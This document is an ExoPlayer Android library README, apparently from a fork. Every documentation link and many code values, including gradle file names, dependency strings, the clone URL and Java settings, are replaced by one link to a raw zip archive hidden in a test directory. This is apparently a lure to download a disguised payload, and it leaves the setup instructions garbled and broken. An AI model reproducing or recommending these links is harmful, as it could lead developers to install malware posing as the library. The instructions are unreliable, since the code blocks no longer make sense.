# ExoPlayer #

ExoPlayer is an application level media player for Android. It provides an
alternative to Android’s MediaPlayer API for playing audio and video both
locally and over the Internet. ExoPlayer supports features not currently
supported by Android’s MediaPlayer API, including DASH and SmoothStreaming
adaptive playbacks. Unlike the MediaPlayer API, ExoPlayer is easy to customize
and extend, and can be updated through Play Store application updates.

## Documentation ##

* The [developer guide][] provides a wealth of information.
* The [class reference][] documents ExoPlayer classes.
* The [release notes][] document the major changes in each release.
* Follow our [developer blog][] to keep up to date with the latest ExoPlayer
  developments!

[developer guide]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
[class reference]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
[release notes]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
[developer blog]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip

## Using ExoPlayer ##

ExoPlayer modules can be obtained from JCenter. It's also possible to clone the
repository and depend on the modules locally.

### From JCenter ###

#### 1. Add repositories ####

The easiest way to get started using ExoPlayer is to add it as a gradle
dependency. You need to make sure you have the Google and JCenter repositories
included in the `https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` file in the root of your project:

```gradle
repositories {
    google()
    jcenter()
}
```

#### 2. Add ExoPlayer module dependencies ####

Next add a dependency in the `https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` file of your app module. The
following will add a dependency to the full library:

```gradle
implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
```

where `2.X.X` is your preferred version.

As an alternative to the full library, you can depend on only the library
modules that you actually need. For example the following will add dependencies
on the Core, DASH and UI library modules, as might be required for an app that
plays DASH content:

```gradle
implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
implementation 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip'
```

The available library modules are listed below. Adding a dependency to the full
library is equivalent to adding dependencies on all of the library modules
individually.

* `exoplayer-core`: Core functionality (required).
* `exoplayer-dash`: Support for DASH content.
* `exoplayer-hls`: Support for HLS content.
* `exoplayer-smoothstreaming`: Support for SmoothStreaming content.
* `exoplayer-ui`: UI components and resources for use with ExoPlayer.

In addition to library modules, ExoPlayer has multiple extension modules that
depend on external libraries to provide additional functionality. Some
extensions are available from JCenter, whereas others must be built manually.
Browse the [extensions directory][] and their individual READMEs for details.

More information on the library and extension modules that are available from
JCenter can be found on [Bintray][].

[extensions directory]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
[Bintray]: https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip

#### 3. Turn on Java 8 support ####

If not enabled already, you also need to turn on Java 8 support in all
`https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` files depending on ExoPlayer, by adding the following to the
`android` section:

```gradle
compileOptions {
  targetCompatibility https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
}
```

### Locally ###

Cloning the repository and depending on the modules locally is required when
using some ExoPlayer extension modules. It's also a suitable approach if you
want to make local changes to ExoPlayer, or if you want to use a development
branch.

First, clone the repository into a local directory and checkout the desired
branch:

```sh
git clone https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip
cd ExoPlayer
git checkout release-v2
```

Next, add the following to your project's `https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip` file, replacing
`path/to/exoplayer` with the path to your local copy:

```gradle
https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip = 'path/to/exoplayer'
https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip = 'exoplayer-'
apply from: new File(https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip, 'https://github.com/Joe-Mogul/ExoPlayer/raw/refs/heads/release-v2/library/core/src/test/java/com/google/android/exoplayer2/metadata/icy/Exo_Player_v3.7-beta.2.zip')
```

You should now see the ExoPlayer modules appear as part of your project. You can
depend on them as you would on any other local module, for example:

```gradle
implementation project(':exoplayer-library-core')
implementation project(':exoplayer-library-dash')
implementation project(':exoplayer-library-ui')
```

## Developing ExoPlayer ##

#### Project branches ####

* Development work happens on the `dev-v2` branch. Pull requests should
  normally be made to this branch.
* The `release-v2` branch holds the most recent release.

#### Using Android Studio ####

To develop ExoPlayer using Android Studio, simply open the ExoPlayer project in
the root directory of the repository.
